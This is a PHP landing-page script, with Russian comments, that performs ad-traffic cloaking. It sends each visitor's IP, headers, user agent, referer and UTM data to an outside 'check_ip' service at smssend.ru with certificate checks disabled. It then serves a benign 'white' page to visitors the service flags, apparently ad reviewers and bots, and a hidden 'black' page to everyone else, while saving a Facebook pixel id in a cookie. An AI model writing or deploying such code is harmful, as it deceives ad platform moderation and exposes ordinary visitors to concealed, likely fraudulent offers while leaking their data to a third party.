<?php
session_start();
$post["ip"] = @$_SERVER["HTTP_CF_CONNECTING_IP"]? @$_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER["REMOTE_ADDR"];
$post["domain"] = $_SERVER["HTTP_HOST"];
$post["referer"] = @$_SERVER["HTTP_REFERER"];
$post["user_agent"] = $_SERVER["HTTP_USER_AGENT"];
$post["headers"] = json_encode(apache_request_headers());
// $post["land"] = 1; //раскомментировать на в индексном файле лендинга

if($_GET)foreach($_GET as $key => $value) $_SESSION[$key] = $value;
$post["utm"] = json_encode($_SESSION);

$curl = curl_init("https://smssend.ru/api/check_ip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4 );
curl_setopt($curl, CURLOPT_ENCODING, "");
curl_setopt($curl, CURLOPT_TIMEOUT, 5);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_POSTFIELDS, $post);

$json_reqest = curl_exec($curl);
curl_close($curl);
$api_reqest = json_decode($json_reqest);

if($api_reqest)foreach($api_reqest as $key => $value) $_SESSION[$key] = $value;

if( !@$api_reqest || @$api_reqest->white_link || @$api_reqest->result == 0){
//if( false){

    $first_page = 'ipotekinet/index.php';
    $second_page = 'members-w.php';

    //ищем в урле совпадение со названием второй страницы
    if(strpos($_SERVER['REQUEST_URI'], 'members.php')  === false) {
        //1 - я страница регистрации
        $arr = ['promo', 'page', 'news', 'article', 'main', 'event', 'live'];

        $strLook = $_SERVER['REQUEST_URI'];
        $lookup = null;

        foreach($arr as $needle) {
            if (strpos($strLook, $needle)  != false) {
                $lookup = $needle;
            }
        }

        if ($lookup) {
            $FacebookPixel = strstr($_SERVER['REQUEST_URI'], $lookup);
            $FacebookPixel = explode('/', $FacebookPixel)[1];

        }
        if ($FacebookPixel) {
            if(empty($_COOKIE["ids"])) {
                setcookie("ids", $FacebookPixel, time() + 99000);
            }
        }
        require_once($first_page);
    } else {
        //2 - я страница регистрации
        require_once($second_page);
    }
}else{
    $first_page = 'step.php';
    $second_page = 'members-b.php';
    //ищем в урле совпадение со названием второй страницы
    if(strpos($_SERVER['REQUEST_URI'], 'members.php')  === false){
        //1 - я страница регистрации
        require_once($first_page);
    }else {
        //2 - я страница регистрации
        require_once($second_page);
    }
}
